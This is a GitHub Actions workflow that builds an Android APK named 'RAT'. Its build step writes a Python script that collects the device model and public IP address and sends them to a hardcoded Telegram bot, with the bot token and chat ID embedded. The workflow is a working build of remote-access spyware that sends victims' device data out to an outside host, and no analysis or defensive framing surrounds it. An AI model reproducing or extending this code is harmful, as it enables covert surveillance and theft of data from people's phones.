name: Build APK
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Install
      run: |
        sudo apt update
        sudo apt install -y openjdk-17-jdk
        pip install buildozer
    - name: Build
      run: |
        cat > main.py << 'EOF'
import os,requests,subprocess,time,threading
T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
C="8631833153"
def send(t):
 try:
  for i in range(0,len(t),4000):
   requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[i:i+4000]},timeout=5)
 except:pass
def get_ip():
 try:return requests.get("https://api.ipify.org").text
 except:return"no"
def get_device():
 try:return subprocess.check_output("getprop ro.product.model",shell=True).decode().strip()
 except:return"no"
send(f"DEVICE: {get_device()} IP: {get_ip()}")
EOF
        buildozer init
        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
        sed -i 's/package.name = .*/package.name = RAT/g' buildozer.spec
        sed -i 's/package.domain = .*/package.domain = org.rat/g' buildozer.spec
        buildozer android debug
    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: APK
        path: bin/*.apk
